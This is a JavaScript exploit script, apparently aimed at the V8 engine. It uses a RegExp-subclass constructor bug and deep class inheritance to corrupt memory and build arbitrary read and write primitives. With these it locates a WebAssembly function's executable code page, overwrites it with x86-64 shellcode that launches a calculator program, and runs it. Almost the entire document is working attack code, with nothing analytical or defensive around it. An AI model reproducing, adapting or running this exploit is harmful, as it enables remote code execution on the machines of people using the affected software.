ENABLE_LOG = true;
IN_WORKER = true;

var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1,
    127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0,
    1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2,
    0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 10, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasmModule, {});
var funcAsm = wasm_instance.exports.main;

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
function print(data) {
    console.log(data)
}

var g_array;
var tDerivedNCount = 17 * 87481 - 8; // 0x16b141
var tDerivedNDepth = 19 * 19; // 0x169

function cb(flag) {
    if (flag == true) {
        return;
    }
    g_array = new Array(0); // g_array = []
    g_array[0] = 0x1dbabe * 2; // 0x3b757c
    return 'c01db33f';
}

function gc() {
    for (var i = 0; i < 0x10000; ++i) {
        new String();
    }
}

function oobAccess() {
    //%SystemBreak();
    var this_ = this;
    this.buffer = null;
    this.buffer_view = null;

    this.page_buffer = null;
    this.page_view = null;

    this.prevent_opt = [];

    class LeakArrayBuffer extends ArrayBuffer {
        constructor() {
            super(0x1000);
            this.slot = this;
        }
    }

    this.page_buffer = new LeakArrayBuffer();
    this.page_view = new DataView(this.page_buffer);

    // <==
    new RegExp({ toString: function () { return 'a' } });
    cb(true);

    class DerivedBase extends RegExp {
        constructor() {
            // var array = null;
            super(
                // at this point, the 4-byte allocation for the JSRegExp `this` object
                // has just happened.
                {
                    toString: cb
                }, 'g'
                // now the runtime JSRegExp constructor is called, corrupting the
                // JSArray.
            );

            // this allocation will now directly follow the FixedArray allocation
            // made for `this.data`, which is where `array.elements` points to.  // ???

            this_.buffer = new ArrayBuffer(0x80);
            g_array[12] = this_.page_buffer;
        }
    }

    // try{
    var derived_n = eval(`(function derived_n(i) {
        if (i == 0) {
            return DerivedBase;
        }

        class DerivedN extends derived_n(i-1) {
            constructor() {
                super();
                return;
                ${"this.a=0;".repeat(tDerivedNCount)}
            }
        }

        return DerivedN;
    })`);

    gc();


    new (derived_n(tDerivedNDepth))();

    this.buffer_view = new DataView(this.buffer);
    this.leakPtr = function (obj) {
        this.page_buffer.slot = obj;
        //return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); // 0x1f
        return this.buffer_view.getUint32(0x4f, true, ...this.prevent_opt); // 0x4f
    }
    this.leakPtrh = function (obj) {
        this.page_buffer.slot = obj;
        //return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); // 0x1f
        return this.buffer_view.getUint32(0x4f + 4, true, ...this.prevent_opt); // 0x4f
    }
    this.setPtr = function (addr) {
        // this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); // 0xf
        this.buffer_view.setUint32(0x1f, addr, true, ...this.prevent_opt); // 0xf
    }
    this.setPtrh = function (addr) {
        // this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); // 0xf
        this.buffer_view.setUint32(0x1f + 4, addr, true, ...this.prevent_opt); // 0xf
    }
    this.setPtr64 = function (addr) {
        this.setPtr(addr % (2 ** 32));
        this.setPtrh(addr / (2 ** 32));
    }
    this.read32 = function (addr) {
        this.setPtr(addr);
        return this.page_view.getUint32(0, true, ...this.prevent_opt);
    }
    this.read64 = function (addr) {
        this.setPtr(addr);
        this.setPtrh(addr / (2 ** 32));
        var l = this.page_view.getUint32(0, true, ...this.prevent_opt);
        var h = this.page_view.getUint32(4, true, ...this.prevent_opt);
        var res = l + h * 0x100000000 - 1;
        print('[*] low at 0x' + l.toString(16));
        print('[*] high at 0x' + h.toString(16));
        print('[*] res at 0x' + res.toString(16));
        return res;
    }
    this.read64h = function (addr) {
        this.setPtr(addr);
        this.setPtrh(addr / (2 ** 32));
        var l = this.page_view.getUint32(0, true, ...this.prevent_opt);
        var h = this.page_view.getUint32(4, true, ...this.prevent_opt);
        print('[*] high at 0x' + h.toString(16));
        return h;
    }
    this.read64l = function (addr) {
        this.setPtr(addr);
        this.setPtrh(addr / (2 ** 32));
        var l = this.page_view.getUint32(0, true, ...this.prevent_opt);
        var h = this.page_view.getUint32(4, true, ...this.prevent_opt);
        print('[*] low at 0x' + l.toString(16));
        return l;
    }
    this.write32 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint32(0, value, true, ...this.prevent_opt);
    }

    this.write8 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint8(0, value, ...this.prevent_opt);
    }
    this.write8_64 = function (addr, value) {
        this.setPtr64(addr);
        this.page_view.setUint8(0, value, ...this.prevent_opt);
    }
    this.setBytes = function (addr, content) {
        for (var i = 0; i < content.length; i++) {
            this.write8(addr + i, content[i]);
        }
    }
    this.setBytes64 = function (addr, content) {
        for (var i = 0; i < content.length; i++) {
            this.write8_64(addr + i, content[i]);
        }
    }
    return this;
}

function trigger() {
    var oob = oobAccess();
    print('[*] show asm function');
    //%DebugPrint(funcAsm);
    var func_ptr = oob.leakPtr(funcAsm);
    var func_ptrh = oob.leakPtrh(funcAsm);
    var fp = func_ptrh * 2 ** 32 + func_ptr - 1;
    print('[*] target_function low at 0x' + func_ptr.toString(16));
    print('[*] target_function high at 0x' + func_ptrh.toString(16));
    print('[*] target_function at 0x' + fp.toString(16));

    var kCodeInsOffset = 0x1b;
    var share_info = oob.read64(fp + 0x18);
    print('[*] share_info at 0x' + share_info.toString(16));
    var code_addr = oob.read64(share_info + 0x8);
    print('[*] code_addr at 0x' + code_addr.toString(16));
    code_addr = code_addr + 0x60;
    print('[*] code_addr(rwx) at 0x' + code_addr.toString(16));
    print('[*] before write shellcode');
    for (var i = 0; i < shellcode.length; i++) {
        this.write8_64(code_addr + i, shellcode[i]);
    }
    print('[*] write shellcode over');
    //%DebugPrint(target_function);
    //%SystemBreak();
    funcAsm(1);
}

try {
    print("start running");
    trigger();
} catch (e) {
    print(e);
}
